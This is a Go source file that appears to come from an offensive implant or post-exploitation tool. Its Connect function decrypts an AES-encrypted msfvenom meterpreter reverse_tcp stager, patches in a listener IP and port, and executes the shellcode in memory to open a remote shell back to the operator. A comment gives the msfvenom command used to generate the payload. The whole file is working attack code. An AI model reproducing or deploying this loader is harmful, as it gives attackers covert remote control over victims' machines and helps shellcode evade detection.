package meter

import (
	"encoding/binary"
	"encoding/hex"
	"math/big"
	"net"
	"strconv"

	"../shell"
	"../utils"
)

// IP4toInt ...
func IP4toInt(IPv4Address net.IP) int64 {
	IPv4Int := big.NewInt(0)
	IPv4Int.SetBytes(IPv4Address.To4())
	return IPv4Int.Int64()
}

// Connect to meterpreter listener
func Connect(ip string, port string) (bool, error) {

	// for now we run the actual msfvenom generated stager because doing it dynamically fails for some unknown reason
	// shellcode generated via: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw & encrypted with static key in utils
	portBytes := make([]byte, 2)
	portInt, _ := strconv.Atoi(port)
	binary.BigEndian.PutUint16(portBytes, uint16(portInt))
	ipBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(ipBytes, uint32(IP4toInt(net.ParseIP(ip))))

	enc := make([]byte, hex.DecodedLen(len(meterlinux)))
	hex.Decode(enc, []byte(meterlinux))
	sc, _ := utils.Decrypt(utils.AESKEY, enc)
	copy(sc[56:], portBytes) //"\x11\x5c" 4444
	copy(sc[58:], ipBytes)   //"\x7f\x00\x00\x01" 127.0.0.1

	go shell.ExecSC([]byte(sc))
	return true, nil
}
